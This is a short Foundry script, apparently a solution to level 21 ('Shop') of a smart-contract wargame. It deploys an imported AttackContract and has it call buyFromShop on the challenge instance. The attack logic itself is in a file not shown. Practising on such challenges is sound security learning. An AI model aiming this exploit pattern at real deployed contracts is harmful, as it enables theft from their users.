// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

import {AttackContract} from "src/Level21.sol";

// ================================================================
// │                         LEVEL 21 - SHOP                      │
// ================================================================
contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();
        vm.startBroadcast();
        AttackContract attackContract = new AttackContract();
        attackContract.buyFromShop(targetContractAddress);
        vm.stopBroadcast();
    }
}
